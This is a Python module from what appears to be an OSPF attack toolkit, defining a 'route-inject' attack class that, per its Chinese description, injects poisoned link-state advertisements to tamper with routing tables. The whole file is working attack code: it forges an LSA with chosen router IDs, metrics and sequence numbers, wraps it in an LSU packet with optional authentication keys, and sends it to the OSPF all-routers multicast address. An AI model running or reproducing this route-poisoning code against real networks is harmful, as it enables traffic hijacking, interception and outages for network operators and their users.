from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import LSAConfig
from ospf_attack.core.packet import build_lsu_packet, build_lsa_with_body, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class RouteInjectAttack(BaseAttack):
    name = "route-inject"
    description = "嗅探合法 LSU 后注入毒化 LSA 篡改路由表"
    category = AttackCategory.LSA
    config: LSAConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)
        lsid = self.config.link_state_id
        if not lsid or lsid == "0.0.0.0":
            lsid = self.config.router_id
        adv = self.config.advertising_router
        if not adv or adv == "0.0.0.0":
            adv = self.config.router_id
        auth_type = {"none": 0, "plain": 1, "md5": 2}.get(self.config.auth_type, 0)
        auth_key = self.config.auth_key.encode() if self.config.auth_key else b""
        lsa = build_lsa_with_body(
            lsa_type=self.config.lsa_type,
            link_state_id=lsid,
            advertising_router=adv,
            sequence=self.config.sequence_number,
            age=self.config.age,
            metric=self.config.metric,
            network_mask=self.config.network_mask,
        )
        pkt = build_lsu_packet(
            router_id=self.config.router_id, area_id=self.config.area_id,
            src_ip=src_ip, dst_ip=OSPF_MULTICAST_ALL, lsa_count=1,
            auth_type=auth_type, auth_key=auth_key,
        )
        pkt = pkt / lsa
        ok = self._sender.send_raw(pkt)
        return AttackResult(success=ok, packets_sent=self._sender.sent_count,
                           target_affected=False,
                           details=f"路由注入: LSA Type={self.config.lsa_type}")

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
